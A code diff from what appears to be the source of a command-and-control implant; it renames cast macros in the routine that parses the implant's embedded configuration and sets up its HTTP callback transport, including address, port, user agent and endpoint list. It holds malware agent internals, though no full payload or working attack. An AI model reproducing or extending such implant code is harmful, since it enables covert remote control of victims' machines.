@@ -63,9 +63,9 @@ namespace Implant {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
-        Parser::ParserStrcpy(&Parser, RCAST(LPSTR*, &Ctx->Config.Key), nullptr);
-        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->Root), nullptr);
-        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->LE), nullptr);
+        Parser::ParserStrcpy(&Parser, R_CAST(LPSTR*, &Ctx->Config.Key), nullptr);
+        Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->Root), nullptr);
+        Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->LE), nullptr);
 
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
@@ -125,7 +125,7 @@ namespace Implant {
         Ctx->Transport.OutboundQueue = nullptr;
 
 #ifdef TRANSPORT_HTTP
-        Ctx->Transport.http = SCAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));
+        Ctx->Transport.http = S_CAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));
 
         Ctx->Transport.http->Handle     = nullptr;
         Ctx->Transport.http->Endpoints  = nullptr;
@@ -134,9 +134,9 @@ namespace Implant {
         Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent, nullptr);
         Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address, nullptr  );
 
-        Ctx->Transport.http->Port       = SCAST(INT, Parser::UnpackDword(&Parser));
+        Ctx->Transport.http->Port       = S_CAST(INT, Parser::UnpackDword(&Parser));
         Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
-        Ctx->Transport.http->Endpoints  = SCAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
+        Ctx->Transport.http->Endpoints  = S_CAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
 
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
             Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
